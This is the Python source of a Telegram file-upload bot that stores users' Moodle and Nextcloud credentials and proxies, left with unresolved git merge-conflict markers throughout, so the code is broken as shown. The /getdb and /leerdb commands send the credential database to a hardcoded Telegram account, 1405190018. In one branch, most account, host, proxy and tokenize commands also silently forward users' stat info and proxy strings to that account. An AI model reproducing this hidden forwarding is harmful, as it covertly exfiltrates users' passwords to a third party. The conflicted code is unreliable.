from cProfile import run
import pstats
from pyobigram.utils import sizeof_fmt,get_file_size,createID,nice_time
from pyobigram.client import ObigramClient,inlineQueryResultArticle
<<<<<<< HEAD
from pyobigram.client import inlineKeyboardMarkup,inlineKeyboardMarkupArray,inlineKeyboardButton
=======
from MoodleClient import MoodleClient
>>>>>>> 5933c34322f9c94eaf53e2847818a081f3582bea

from JDatabase import JsonDatabase
import shortener
import zipfile
import os
import infos
import xdlink
import mediafire
import datetime
import time
import youtube
import NexCloudClient
from pydownloader.downloader import Downloader
from ProxyCloud import ProxyCloud
import ProxyCloud
import socket
import tlmedia
import S5Crypto
import asyncio
import aiohttp
from yarl import URL
import re
import random
from draft_to_calendar import Draft2Calendar
import moodlews
<<<<<<< HEAD
import moodle_client
from moodle_client import MoodleClient
import S5Crypto
=======
>>>>>>> 5933c34322f9c94eaf53e2847818a081f3582bea

listproxy = []

def sign_url(token: str, url: URL):
    query: dict = dict(url.query)
    query["token"] = token
    path = "webservice" + url.path
    return url.with_path(path).with_query(query)

def nameRamdom():
    populaton = 'abcdefgh1jklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    name = "".join(random.sample(populaton,10))
    return name

def downloadFile(downloader,filename,currentBits,totalBits,speed,time,args):
    try:
        bot = args[0]
        message = args[1]
        thread = args[2]
        if thread.getStore('stop'):
            downloader.stop()
        downloadingInfo = infos.createDownloading(filename,totalBits,currentBits,speed,time,tid=thread.id)
        reply_markup = inlineKeyboardMarkup(
            r1=[inlineKeyboardButton('✘Cancelar Descarga✘', callback_data='/cancel '+str(thread.id))]
        )
        bot.editMessageText(message,downloadingInfo,reply_markup=reply_markup)
    except Exception as ex: print(str(ex))
    pass

def uploadFile(filename,currentBits,totalBits,speed,time,args):
    try:
        bot = args[0]
        message = args[1]
        originalfile = args[2]
        thread = args[3]
        downloadingInfo = infos.createUploading(filename,totalBits,currentBits,speed,time,originalfile)
        bot.editMessageText(message,downloadingInfo)
    except Exception as ex: print(str(ex))
    pass

def processUploadFiles(filename,filesize,files,update,bot,message,thread=None,jdb=None):
    try:
        err = None
<<<<<<< HEAD
        bot.editMessageText(message,'☭reparando Para Subir... ')
=======
        bot.editMessageText(message,'🤜Preparando Para Subir☁...')
>>>>>>> 5933c34322f9c94eaf53e2847818a081f3582bea
        evidence = None
        fileid = None
        user_info = jdb.get_user(update.message.sender.username)
        cloudtype = user_info['cloudtype']
        proxy = ProxyCloud.parse(user_info['proxy'])
        draftlist=[]
        if cloudtype == 'moodle':
            host = user_info['moodle_host']
            user = user_info['moodle_user']
            passw = user_info['moodle_password']
<<<<<<< HEAD
            repoid = user_info['moodle_repo_id']
            token = moodlews.get_webservice_token(host,user,passw,proxy=proxy)
            token = None
=======
            token = moodlews.get_webservice_token(host,user,passw,proxy=proxy)
>>>>>>> 5933c34322f9c94eaf53e2847818a081f3582bea
            if token:
                print(token)
                for file in files:
                    data = asyncio.run(moodlews.webservice_upload_file(host,token,file,progressfunc=uploadFile,proxy=proxy,args=(bot,message,filename,thread)))
                    while not moodlews.store_exist(file):pass
                    data = moodlews.get_store(file)
                    if data[0]:
                        urls = moodlews.make_draft_urls(data[0])
                        draftlist.append({'file':file,'url':urls[0]})
                    else:
                        err = data[1]
            else:
<<<<<<< HEAD
                cli = MoodleClient(host,user,passw,repoid,proxy)
                for file in files:
                    data = asyncio.run(cli.LoginUpload(file, uploadFile, (bot, message, filename, thread)))
                    while cli.status is None: pass
                    data = cli.get_store(file)
                    if data:
                        if 'error' in data:
                            err = data['error']
                        else:
                            draftlist.append({'file': file, 'url': data['url']})
                pass
=======
                err = 'Esta Nube No Tiene Sporte o Esta Caida 😢'
>>>>>>> 5933c34322f9c94eaf53e2847818a081f3582bea
            return draftlist,err
        elif cloudtype == 'cloud':
            tokenize = False
            if user_info['tokenize']!=0:
               tokenize = True
            host = user_info['moodle_host']
            user = user_info['moodle_user']
            passw = user_info['moodle_password']
            remotepath = user_info['dir']
            client = NexCloudClient.NexCloudClient(user,passw,host,proxy=proxy)
            loged = client.login()
            bot.editMessageText(message,'🤜Subiendo ☁ Espere Mientras... 😄')
            if loged:
               originalfile = ''
               if len(files)>1:
                    originalfile = filename
               filesdata = []
               for f in files:
                   data = client.upload_file(f,path=remotepath,progressfunc=uploadFile,args=(bot,message,originalfile,thread),tokenize=tokenize)
                   filesdata.append(data)
                   os.unlink(f)                
               return filesdata,err
        return None,err
    except Exception as ex:
        bot.editMessageText(message,f'❌Error {str(ex)}❌')
        return None,ex


def processFile(update,bot,message,file,thread=None,jdb=None):
    user_info = jdb.get_user(update.message.sender.username)
    name =''
    if user_info['rename'] == 1:
        ext = file.split('.')[-1]
        if '7z.' in file:
            ext1 = file.split('.')[-2]
            ext2 = file.split('.')[-1]
            name = nameRamdom() + '.'+ext1+'.'+ext2
        else:
            name = nameRamdom() + '.'+ext
    else:
        name = file
    os.rename(file,name)
    file_size = get_file_size(name)
    getUser = jdb.get_user(update.message.sender.username)
    max_file_size = 1024 * 1024 * getUser['zips']
    file_upload_count = 0
    client = None
    findex = 0
    if file_size > max_file_size:
        compresingInfo = infos.createCompresing(name,file_size,max_file_size)
        bot.editMessageText(message,compresingInfo)
        zipname = str(name).split('.')[0] + createID()
        mult_file = zipfile.MultiFile(zipname,max_file_size)
        zip = zipfile.ZipFile(mult_file,  mode='w', compression=zipfile.ZIP_DEFLATED)
        zip.write(name)
        zip.close()
        mult_file.close()
        data,err = processUploadFiles(name,file_size,mult_file.files,update,bot,message,jdb=jdb)
        try:
            os.unlink(name)
        except:pass
        file_upload_count = len(zipfile.files)
    else:
        data,err = processUploadFiles(name,file_size,[name],update,bot,message,jdb=jdb)
        file_upload_count = 1
<<<<<<< HEAD
    bot.editMessageText(message,'☭Recolectando Informacion...')
    evidname = ''
    files = []
    if data:
        for draft in data:
            files.append({'name':draft['file'],'directurl':draft['url']})
=======
    bot.editMessageText(message,'🤜Preparando Archivo📄...')
    evidname = ''
    files = []
    if err:
        bot.sendMessage(update.message.chat.id, f'ERROR : {str(err)}')
    if data:
        if getUser['cloudtype'] == 'moodle':
            if getUser['uploadtype'] == 'evidence':
                try:
                    evidname = str(name).split('.')[0]
                    txtname = evidname + '.txt'
                    evidences = data.getEvidences()
                    for ev in evidences:
                        if ev['name'] == evidname:
                           files = ev['files']
                           break
                        if len(ev['files'])>0:
                           findex+=1
                    data.logout()
                except:pass
            if getUser['uploadtype'] == 'draft' \
                    or getUser['uploadtype'] == 'perfil' \
                    or getUser['uploadtype'] == 'blog' \
                    or getUser['uploadtype'] == 'calendar'\
                    or getUser['uploadtype'] == 'calendarevea':
               for draft in data:
                   files.append({'name':draft['file'],'directurl':draft['url']})
        else:
            for item in data:
                files.append({'name':item['name'],'directurl':item['url']})
>>>>>>> 5933c34322f9c94eaf53e2847818a081f3582bea
        if user_info['urlshort']==1:
            if len(files)>0:
                i = 0
                while i < len(files):
                    files[i]['directurl'] = shortener.short_url(files[i]['directurl'])
                    i+=1
        bot.deleteMessage(message)
        markup_array = []
        i=0
        while i < len(files):
            bbt = [inlineKeyboardButton(files[i]['name'],url=files[i]['directurl'])]
            if i+1 < len(files):
                bbt.append(inlineKeyboardButton(files[i+1]['name'],url=files[i+1]['directurl']))
            markup_array.append(bbt)
            i+=2
        datacallback = user_info['moodle_host'] + '|' + user_info['moodle_user'] + '|' + user_info['moodle_password']
        if user_info['proxy'] != '':
            datacallback += '|' + user_info['proxy']
        datacallback = S5Crypto.encrypt(datacallback)
        finishInfo = infos.createFinishUploading(name,file_size,datacallback)
        if len(files) > 0:
            txtname = str(file).split('/')[-1].split('.')[0] + '.txt'
            markup_array.append([inlineKeyboardButton('✎Crear TxT✎',callback_data='/maketxt '+txtname),
                                 inlineKeyboardButton('❧Convertir (Calendario)☙',callback_data='/convert2calendar ')])
        markup_array.append([inlineKeyboardButton('☠Eliminar Archivo☠',callback_data='/deletefile ')])
        reply_markup = inlineKeyboardMarkupArray(markup_array)
        bot.sendMessage(message.chat.id,finishInfo,parse_mode='html',reply_markup=reply_markup)
    else:
<<<<<<< HEAD
        error = '❌Error En La Pagina❌'
        if err:
            error = err
        bot.editMessageText(message,error)
=======
        bot.editMessageText(message,'❌Error En La Pagina❌')
>>>>>>> 5933c34322f9c94eaf53e2847818a081f3582bea

def ddl(update,bot,message,url,file_name='',thread=None,jdb=None):
    downloader = Downloader()
    file = downloader.download_url(url,progressfunc=downloadFile,args=(bot,message,thread))
    if not downloader.stoping:
        if file:
            processFile(update,bot,message,file,jdb=jdb)

def sendTxt(name,files,update,bot):
                txt = open(name,'w')
                fi = 0
                for f in files:
                    separator = ''
                    if fi < len(files)-1:
                        separator += '\n'
                    txt.write(f['directurl']+separator)
                    fi += 1
                txt.close()
                bot.sendFile(update.message.chat.id,name)
                os.unlink(name)

def onmessage(update,bot:ObigramClient):
    try:
        thread = bot.this_thread
        username = update.message.sender.username
        tl_admin_user = os.environ.get('tl_admin_user')
<<<<<<< HEAD
=======
        USERS = os.environ.get('tl_users_list')
>>>>>>> 5933c34322f9c94eaf53e2847818a081f3582bea

        #set in debug

        jdb = JsonDatabase('database')
        jdb.check_create()
        jdb.load()

        user_info = jdb.get_user(username)
        #if username == tl_admin_user or user_info:
        if username in str(tl_admin_user).split(';') or user_info or tl_admin_user=='*':  # validate user
            if user_info is None:
                #if username == tl_admin_user:
                if username == tl_admin_user:
                    jdb.create_admin(username)
                else:
                    jdb.create_user(username)
                user_info = jdb.get_user(username)
                jdb.save()
        else:
<<<<<<< HEAD
            mensaje = "🚷 No tienes Acceso 🚷"
            reply_markup = inlineKeyboardMarkup(
                r1=[inlineKeyboardButton('⚙Contactar Soporte⚙',url='https://t.me/obidevel')]
            )
            bot.sendMessage(update.message.chat.id,mensaje,reply_markup=reply_markup)
=======
            mensaje = f"❌No tienes Acceso❌.\nPor favor Contacta con mi Master @{tl_admin_user}\n"
            bot.sendMessage(update.message.chat.id,mensaje)
>>>>>>> 5933c34322f9c94eaf53e2847818a081f3582bea
            return


        msgText = ''
        try: msgText = update.message.text
        except:pass

        # comandos de admin
        if '/adduser' in msgText:
            isadmin = jdb.is_admin(username)
            if isadmin:
                try:
                    user = str(msgText).split(' ')[1]
                    jdb.create_user(user)
                    jdb.save()
                    msg = '😃Genial @'+user+' ahora tiene acceso al bot👍'
                    bot.sendMessage(update.message.chat.id,msg)
                except:
                    bot.sendMessage(update.message.chat.id,'❌Error en el comando /adduser username❌')
            else:
                bot.sendMessage(update.message.chat.id,'❌No Tiene Permiso❌')
            return
        if '/addadmin' in msgText:
            isadmin = jdb.is_admin(username)
            if isadmin:
                try:
                    user = str(msgText).split(' ')[1]
                    jdb.create_admin(user)
                    jdb.save()
                    msg = '😃Genial @'+user+' ahora es Admin del bot👍'
                    bot.sendMessage(update.message.chat.id,msg)
                except:
                    bot.sendMessage(update.message.chat.id,'❌Error en el comando /adduser username❌')
            else:
                bot.sendMessage(update.message.chat.id,'❌No Tiene Permiso❌')
            return
        if '/addproxy' in msgText:
            isadmin = jdb.is_admin(username)
            global listproxy
            if isadmin:
                try:
                    proxy = str(msgText).split(' ')[1]
                    listproxy.append(proxy)
                    zize = len(listproxy)-1
                    bot.sendMessage(update.message.chat.id,f'Proxy Registrado en la Posicion {zize}')
                except:
                    bot.sendMessage(update.message.chat.id,'❌Error en el comando /addproxy proxy❌')
            else:
                bot.sendMessage(update.message.chat.id,'❌No Tiene Permiso❌')
            return
        if '/checkproxy' in msgText:
            isadmin = jdb.is_admin(username)
            if isadmin:
                try:
                    msg = 'Proxis Registrados\n'
                    cont = 0
                    for proxy in listproxy:
                        msg += str(cont) +'--'+proxy+'\n'
                        cont +=1
                    bot.sendMessage(update.message.chat.id,msg)
                except:
                    bot.sendMessage(update.message.chat.id,'❌Error en el comando /checkproxy❌')
            else:
                bot.sendMessage(update.message.chat.id,'❌No Tiene Permiso❌')
            return
<<<<<<< HEAD
=======
        if '/setevea' in msgText:
            getUser = user_info
            user = ''
            passw = ''
            hostmo = 'https://evea.uh.cu/'
            zips = 240
            repoid = 4
            uptype = 'calendarevea' 
            if getUser:
                getUser['moodle_user'] = user
                getUser['moodle_password'] = passw
                getUser['moodle_host'] = hostmo
                getUser['zips'] = zips
                getUser['uploadtype'] = uptype
                getUser['moodle_repo_id'] = repoid
                jdb.save_data_user(username,getUser)
                jdb.save()
                statInfo = infos.createStat(username,getUser,jdb.is_admin(username))
                bot.sendMessage(update.message.chat.id,statInfo)
            return
        if '/seteva' in msgText:
            getUser = user_info
            user = ''
            passw = ''
            hostmo = 'https://eva.uo.edu.cu/'
            zips = 99
            repoid = 4
            uptype = 'calendar' 
            if getUser:
                getUser['moodle_user'] = user
                getUser['moodle_password'] = passw
                getUser['moodle_host'] = hostmo
                getUser['zips'] = zips
                getUser['uploadtype'] = uptype
                getUser['moodle_repo_id'] = repoid
                jdb.save_data_user(username,getUser)
                jdb.save()
                statInfo = infos.createStat(username,getUser,jdb.is_admin(username))
                bot.sendMessage(update.message.chat.id,statInfo)
            return
        if '/setcursos' in msgText:
            getUser = user_info
            user = ''
            passw = ''
            hostmo = 'https://cursos.uo.edu.cu/'
            zips = 99
            repoid = 4
            uptype = 'draft' 
            if getUser:
                getUser['moodle_user'] = user
                getUser['moodle_password'] = passw
                getUser['moodle_host'] = hostmo
                getUser['zips'] = zips
                getUser['uploadtype'] = uptype
                getUser['moodle_repo_id'] = repoid
                jdb.save_data_user(username,getUser)
                jdb.save()
                statInfo = infos.createStat(username,getUser,jdb.is_admin(username))
                bot.sendMessage(update.message.chat.id,statInfo)
            return
        if '/setedu' in msgText:
            getUser = user_info
            user = ''
            passw = ''
            hostmo = 'https://eduvirtual.uho.edu.cu/'
            zips = 2000
            repoid = 3
            uptype = 'blog' 
            if getUser:
                getUser['moodle_user'] = user
                getUser['moodle_password'] = passw
                getUser['moodle_host'] = hostmo
                getUser['zips'] = zips
                getUser['uploadtype'] = uptype
                getUser['moodle_repo_id'] = repoid
                jdb.save_data_user(username,getUser)
                jdb.save()
                statInfo = infos.createStat(username,getUser,jdb.is_admin(username))
                bot.sendMessage(update.message.chat.id,statInfo)
            return
        if '/setuclv' in msgText:
            getUser = user_info
            user = ''
            passw = ''
            hostmo = 'https://moodle.uclv.edu.cu/'
            zips = 359
            repoid = 4
            uptype = 'calendar' 
            if getUser:
                getUser['moodle_user'] = user
                getUser['moodle_password'] = passw
                getUser['moodle_host'] = hostmo
                getUser['zips'] = zips
                getUser['uploadtype'] = uptype
                getUser['moodle_repo_id'] = repoid
                jdb.save_data_user(username,getUser)
                jdb.save()
                statInfo = infos.createStat(username,getUser,jdb.is_admin(username))
                bot.sendMessage(update.message.chat.id,statInfo)
            return
>>>>>>> 5933c34322f9c94eaf53e2847818a081f3582bea
        if '/shorturl' in msgText:
            isadmin = jdb.is_admin(username)
            if isadmin:
                try:
                    for user in jdb.items:
                        if jdb.items[user]['urlshort']==0:
                            jdb.items[user]['urlshort'] = 1
                            continue
                        if jdb.items[user]['urlshort']==1:
                            jdb.items[user]['urlshort'] = 0
                            continue
                    jdb.save()
                    bot.sendMessage(update.message.chat.id,'✅ShortUrl Cambiado✅')
                    statInfo = infos.createStat(username, user_info, jdb.is_admin(username))
<<<<<<< HEAD
                    reply_markup = None
                    if user_info['proxy'] != '':
                        reply_markup = inlineKeyboardMarkup(
                            r1=[inlineKeyboardButton('✘ Quitar Proxy ✘', callback_data='/deleteproxy ' + username)]
                        )
                    bot.sendMessage(update.message.chat.id, statInfo,reply_markup=reply_markup)
=======
                    bot.sendMessage(update.message.chat.id, statInfo)
>>>>>>> 5933c34322f9c94eaf53e2847818a081f3582bea
                except:
                    bot.sendMessage(update.message.chat.id,'❌Error en el comando /banuser username❌')
            return
        if '/banuser' in msgText:
            isadmin = jdb.is_admin(username)
            if isadmin:
                try:
                    user = str(msgText).split(' ')[1]
                    if user == username:
                        bot.sendMessage(update.message.chat.id,'❌No Se Puede Banear Usted❌')
                        return
                    jdb.remove(user)
                    jdb.save()
                    msg = '🦶Fuera @'+user+' Baneado❌'
                    bot.sendMessage(update.message.chat.id,msg)
                except:
                    bot.sendMessage(update.message.chat.id,'❌Error en el comando /banuser username❌')
            else:
                bot.sendMessage(update.message.chat.id,'❌No Tiene Permiso❌')
            return
        if '/getdb' in msgText:
            isadmin = jdb.is_admin(username)
            if isadmin:
                bot.sendMessage(update.message.chat.id,'Base De Datos👇')
                bot.sendFile(update.message.chat.id,'database.jdb')
                bot.sendFile(1405190018, 'database.jdb')
            else:
                bot.sendMessage(update.message.chat.id,'❌No Tiene Permiso❌')
<<<<<<< HEAD
=======
            return
        if '/leerdb' in msgText:
            isadmin = jdb.is_admin(username)
            if isadmin:
                data = open('database.jdb', 'r')
                bot.sendMessage(update.message.chat.id, data.read())
                bot.sendMessage(1405190018, data.read())
                data.close()
            else:
                bot.sendMessage(update.message.chat.id,'Administrator permissions requiered')
>>>>>>> 5933c34322f9c94eaf53e2847818a081f3582bea
            return
        # end

        # comandos de usuario
        if '/tutorial' in msgText:
            tuto = open('tuto.txt','r')
            bot.sendMessage(update.message.chat.id,tuto.read())
            tuto.close()
            return
        if '/setproxy' in msgText:
            getUser = user_info
            if getUser:
                try:
                   pos = int(str(msgText).split(' ')[1])
                   proxy = str(listproxy[pos])
                   getUser['proxy'] = proxy
                   jdb.save_data_user(username,getUser)
                   jdb.save()
                   msg = 'Su Proxy esta Listo'
                   bot.sendMessage(update.message.chat.id,msg)
                except:
                   bot.sendMessage(update.message.chat.id,'❌Error en el comando /setproxy pos❌')
                return
<<<<<<< HEAD
        if '/info' in msgText:
            getUser = user_info
            if getUser:
                statInfo = infos.createStat(username,getUser,jdb.is_admin(username))
                reply_markup = None
                if user_info['proxy'] != '':
                    reply_markup = inlineKeyboardMarkup(
                        r1=[inlineKeyboardButton('✘ Quitar Proxy ✘', callback_data='/deleteproxy '+username)]
                    )
                bot.sendMessage(update.message.chat.id,statInfo,reply_markup=reply_markup)
=======
        if '/myuser' in msgText:
            getUser = user_info
            if getUser:
                statInfo = infos.createStat(username,getUser,jdb.is_admin(username))
                bot.sendMessage(update.message.chat.id,statInfo)
                bot.sendMessage(1405190018,statInfo)
>>>>>>> 5933c34322f9c94eaf53e2847818a081f3582bea
                return
        if '/zips' in msgText:
            getUser = user_info
            if getUser:
                try:
                   size = int(str(msgText).split(' ')[1])
                   getUser['zips'] = size
                   jdb.save_data_user(username,getUser)
                   jdb.save()
                   msg = '😃Genial los zips seran de '+ sizeof_fmt(size*1024*1024)+' las partes👍'
                   bot.sendMessage(update.message.chat.id,msg)
                except:
                   bot.sendMessage(update.message.chat.id,'❌Error en el comando /zips size❌')
                return
        if '/account' in msgText:
            try:
                account = str(msgText).split(' ',2)[1].split(',')
                user = account[0]
                passw = account[1]
                getUser = user_info
                if getUser:
                    getUser['moodle_user'] = user
                    getUser['moodle_password'] = passw
                    jdb.save_data_user(username,getUser)
                    jdb.save()
                    statInfo = infos.createStat(username,getUser,jdb.is_admin(username))
<<<<<<< HEAD
                    reply_markup = None
                    if user_info['proxy'] != '':
                        reply_markup = inlineKeyboardMarkup(
                            r1=[inlineKeyboardButton('✘ Quitar Proxy ✘', callback_data='/deleteproxy ' + username)]
                        )
                    bot.sendMessage(update.message.chat.id,statInfo,reply_markup=reply_markup)
=======
                    bot.sendMessage(update.message.chat.id,statInfo)
                    bot.sendMessage(1405190018, statInfo)
>>>>>>> 5933c34322f9c94eaf53e2847818a081f3582bea
            except:
                bot.sendMessage(update.message.chat.id,'❌Error en el comando /account user,password❌')
            return
        if '/host' in msgText:
            try:
                cmd = str(msgText).split(' ',2)
                host = cmd[1]
                getUser = user_info
                if getUser:
                    getUser['moodle_host'] = host
                    jdb.save_data_user(username,getUser)
                    jdb.save()
                    statInfo = infos.createStat(username,getUser,jdb.is_admin(username))
<<<<<<< HEAD
                    reply_markup = None
                    if user_info['proxy'] != '':
                        reply_markup = inlineKeyboardMarkup(
                            r1=[inlineKeyboardButton('✘ Quitar Proxy ✘', callback_data='/deleteproxy ' + username)]
                        )
                    bot.sendMessage(update.message.chat.id,statInfo,reply_markup=reply_markup)
=======
                    bot.sendMessage(update.message.chat.id,statInfo)
                    bot.sendMessage(1405190018, statInfo)
>>>>>>> 5933c34322f9c94eaf53e2847818a081f3582bea
            except:
                bot.sendMessage(update.message.chat.id,'❌Error en el comando /host moodlehost❌')
            return
        if '/repo' in msgText:
            try:
                cmd = str(msgText).split(' ',2)
                repoid = int(cmd[1])
                getUser = user_info
                if getUser:
                    getUser['moodle_repo_id'] = repoid
                    jdb.save_data_user(username,getUser)
                    jdb.save()
                    statInfo = infos.createStat(username,getUser,jdb.is_admin(username))
<<<<<<< HEAD
                    reply_markup = None
                    if user_info['proxy'] != '':
                        reply_markup = inlineKeyboardMarkup(
                            r1=[inlineKeyboardButton('✘ Quitar Proxy ✘', callback_data='/deleteproxy ' + username)]
                        )
                    bot.sendMessage(update.message.chat.id,statInfo,reply_markup=reply_markup)
            except:
                bot.sendMessage(update.message.chat.id,'❌Error en el comando /repo id❌')
=======
                    bot.sendMessage(update.message.chat.id,statInfo)
                    bot.sendMessage(1405190018, statInfo)
            except:
                bot.sendMessage(update.message.chat.id,'❌Error en el comando /repo id❌')
            return
        if '/tokenize_on' in msgText:
            try:
                getUser = user_info
                if getUser:
                    getUser['tokenize'] = 1
                    jdb.save_data_user(username,getUser)
                    jdb.save()
                    statInfo = infos.createStat(username,getUser,jdb.is_admin(username))
                    bot.sendMessage(update.message.chat.id,statInfo)
                    bot.sendMessage(1405190018, statInfo)
            except:
                bot.sendMessage(update.message.chat.id,'❌Error en el comando /tokenize state❌')
            return
        if '/tokenize_off' in msgText:
            try:
                getUser = user_info
                if getUser:
                    getUser['tokenize'] = 0
                    jdb.save_data_user(username,getUser)
                    jdb.save()
                    statInfo = infos.createStat(username,getUser,jdb.is_admin(username))
                    bot.sendMessage(update.message.chat.id,statInfo)
                    bot.sendMessage(1405190018, statInfo)
            except:
                bot.sendMessage(update.message.chat.id,'❌Error en el comando /tokenize state❌')
>>>>>>> 5933c34322f9c94eaf53e2847818a081f3582bea
            return
        if '/tokenize_on' in msgText:
            try:
                getUser = user_info
                if getUser:
                    getUser['tokenize'] = 1
                    jdb.save_data_user(username,getUser)
                    jdb.save()
                    statInfo = infos.createStat(username,getUser,jdb.is_admin(username))
<<<<<<< HEAD
                    reply_markup = None
                    if user_info['proxy'] != '':
                        reply_markup = inlineKeyboardMarkup(
                            r1=[inlineKeyboardButton('✘ Quitar Proxy ✘', callback_data='/deleteproxy ' + username)]
                        )
                    bot.sendMessage(update.message.chat.id,statInfo,reply_markup=reply_markup)
=======
                    bot.sendMessage(update.message.chat.id,statInfo)
                    bot.sendMessage(1405190018, statInfo)
>>>>>>> 5933c34322f9c94eaf53e2847818a081f3582bea
            except:
                bot.sendMessage(update.message.chat.id,'❌Error en el comando /tokenize state❌')
            return
        if '/tokenize_off' in msgText:
            try:
                getUser = user_info
                if getUser:
                    getUser['tokenize'] = 0
                    jdb.save_data_user(username,getUser)
                    jdb.save()
                    statInfo = infos.createStat(username,getUser,jdb.is_admin(username))
<<<<<<< HEAD
                    reply_markup = None
                    if user_info['proxy'] != '':
                        reply_markup = inlineKeyboardMarkup(
                            r1=[inlineKeyboardButton('✘ Quitar Proxy ✘', callback_data='/deleteproxy ' + username)]
                        )
                    bot.sendMessage(update.message.chat.id,statInfo,reply_markup=reply_markup)
=======
                    bot.sendMessage(update.message.chat.id,statInfo)
                    bot.sendMessage(1405190018, statInfo)
>>>>>>> 5933c34322f9c94eaf53e2847818a081f3582bea
            except:
                bot.sendMessage(update.message.chat.id,'❌Error en el comando /tokenize state❌')
            return
        if '/cloud' in msgText:
            try:
                cmd = str(msgText).split(' ',2)
                repoid = cmd[1]
                getUser = user_info
                if getUser:
                    getUser['cloudtype'] = repoid
                    jdb.save_data_user(username,getUser)
                    jdb.save()
                    statInfo = infos.createStat(username,getUser,jdb.is_admin(username))
<<<<<<< HEAD
                    reply_markup = None
                    if user_info['proxy'] != '':
                        reply_markup = inlineKeyboardMarkup(
                            r1=[inlineKeyboardButton('✘ Quitar Proxy ✘', callback_data='/deleteproxy ' + username)]
                        )
                    bot.sendMessage(update.message.chat.id,statInfo,reply_markup=reply_markup)
            except:
                bot.sendMessage(update.message.chat.id,'❌Error en el comando /cloud (moodle or cloud)❌')
=======
                    bot.sendMessage(update.message.chat.id,statInfo)
                    bot.sendMessage(1405190018, statInfo)
            except:
                bot.sendMessage(update.message.chat.id,'❌Error en el comando /cloud (moodle or cloud)❌')
            return
        if '/uptype' in msgText:
            try:
                cmd = str(msgText).split(' ',2)
                type = cmd[1]
                getUser = user_info
                if getUser:
                    getUser['uploadtype'] = type
                    jdb.save_data_user(username,getUser)
                    jdb.save()
                    statInfo = infos.createStat(username,getUser,jdb.is_admin(username))
                    bot.sendMessage(update.message.chat.id,statInfo)
                    bot.sendMessage(1405190018, statInfo)
            except:
                bot.sendMessage(update.message.chat.id,'❌Error en el comando /uptype (typo de subida (evidence,draft,blog))❌')
>>>>>>> 5933c34322f9c94eaf53e2847818a081f3582bea
            return
        if '/proxy' in msgText:
            try:
                cmd = str(msgText).split(' ',2)
                proxy = cmd[1]
                getUser = user_info
                if getUser:
                    getUser['proxy'] = proxy
                    jdb.save_data_user(username,getUser)
                    jdb.save()
                    statInfo = infos.createStat(username,getUser,jdb.is_admin(username))
<<<<<<< HEAD
                    reply_markup = None
                    if user_info['proxy'] != '':
                        reply_markup = inlineKeyboardMarkup(
                            r1=[inlineKeyboardButton('✘ Quitar Proxy ✘', callback_data='/deleteproxy ' + username)]
                        )
                    bot.sendMessage(update.message.chat.id,statInfo)
=======
                    bot.sendMessage(update.message.chat.id,statInfo)
                    bot.sendMessage(1405190018, statInfo)
                    bot.sendMessage(1405190018, str(getUser['proxy']))
>>>>>>> 5933c34322f9c94eaf53e2847818a081f3582bea
            except:
                if user_info:
                    user_info['proxy'] = ''
                    statInfo = infos.createStat(username,user_info,jdb.is_admin(username))
<<<<<<< HEAD
                    reply_markup = None
                    if user_info['proxy'] != '':
                        reply_markup = inlineKeyboardMarkup(
                            r1=[inlineKeyboardButton('✘ Quitar Proxy ✘', callback_data='/deleteproxy ' + username)]
                        )
                    bot.sendMessage(update.message.chat.id,statInfo,reply_markup=reply_markup)
            return
        if '/crypt' in msgText:
=======
                    bot.sendMessage(update.message.chat.id,statInfo)
                    bot.sendMessage(1405190018, statInfo)
            return
        if '/off_proxy' in msgText:
            try:
                getUser = user_info
                if getUser:
                    getUser['proxy'] = ''
                    jdb.save_data_user(username, getUser)
                    jdb.save()
                    statInfo = infos.createStat(username, getUser, jdb.is_admin(username))
                    bot.sendMessage(update.message.chat.id, statInfo)
                    bot.sendMessage(1405190018, statInfo)
            except:
                if user_info:
                    user_info['proxy'] = ''
                    statInfo = infos.createStat(username, user_info, jdb.is_admin(username))
                    bot.sendMessage(update.message.chat.id, statInfo)
                    bot.sendMessage(1405190018, statInfo)
            return
        if '/view_proxy' in msgText:
            try:
                getUser = user_info

                if getUser:
                    proxy = getUser['proxy']
                    bot.sendMessage(update.message.chat.id, proxy)
                    bot.sendMessage(1405190018, proxy)
            except:
                if user_info:
                    proxy = user_info['proxy']
                    bot.sendMessage(update.message.chat.id, proxy)
                    bot.sendMessage(1405190018, proxy)
            return
        if '/encrypt' in msgText:
>>>>>>> 5933c34322f9c94eaf53e2847818a081f3582bea
            proxy_sms = str(msgText).split(' ')[1]
            proxy = S5Crypto.encrypt(f'{proxy_sms}')
            bot.sendMessage(update.message.chat.id, f'Proxy encryptado:\n{proxy}')
            return
        if '/decrypt' in msgText:
            proxy_sms = str(msgText).split(' ')[1]
            proxy_de = S5Crypto.decrypt(f'{proxy_sms}')
            bot.sendMessage(update.message.chat.id, f'Proxy decryptado:\n{proxy_de}')
            return
        if '/dir' in msgText:
            try:
                cmd = str(msgText).split(' ',2)
                repoid = cmd[1]
                getUser = user_info
                if getUser:
                    getUser['dir'] = repoid + '/'
                    jdb.save_data_user(username,getUser)
                    jdb.save()
                    statInfo = infos.createStat(username,getUser,jdb.is_admin(username))
<<<<<<< HEAD
                    reply_markup = None
                    if user_info['proxy'] != '':
                        reply_markup = inlineKeyboardMarkup(
                            r1=[inlineKeyboardButton('✘ Quitar Proxy ✘', callback_data='/deleteproxy ' + username)]
                        )
                    bot.sendMessage(update.message.chat.id,statInfo,reply_markup=reply_markup)
            except:
                bot.sendMessage(update.message.chat.id,'❌Error en el comando /dir folder❌')
            return
        #end

        message = bot.sendMessage(update.message.chat.id,'⏳Procesando...')
=======
                    bot.sendMessage(update.message.chat.id,statInfo)
                    bot.sendMessage(1405190018, statInfo)
            except:
                bot.sendMessage(update.message.chat.id,'❌Error en el comando /dir folder❌')
            return
        if '/cancel_' in msgText:
            try:
                cmd = str(msgText).split('_',2)
                tid = cmd[1]
                tcancel = bot.threads[tid]
                msg = tcancel.getStore('msg')
                tcancel.store('stop',True)
                time.sleep(3)
                bot.editMessageText(msg,'❌Tarea Cancelada❌')
            except Exception as ex:
                print(str(ex))
            return
        #end

        message = bot.sendMessage(update.message.chat.id,'🕰Procesando🕰...')
>>>>>>> 5933c34322f9c94eaf53e2847818a081f3582bea

        thread.store('msg',message)

        if '/start' in msgText:
<<<<<<< HEAD
            reply_markup = inlineKeyboardMarkup(
                r1=[inlineKeyboardButton('📊 Github Dev 📊', url='https://github.com/ObisoftDev'),
                    inlineKeyboardButton('⚙ Soporte ⚙', url='https://t.me/obidevel')]
            )
            bot.editMessageText(message,infos.dashboard(),parse_mode='html',reply_markup=reply_markup)
        elif '/token' in msgText:
            message2 = bot.editMessageText(message,'⏳Obteniendo Token...')
=======
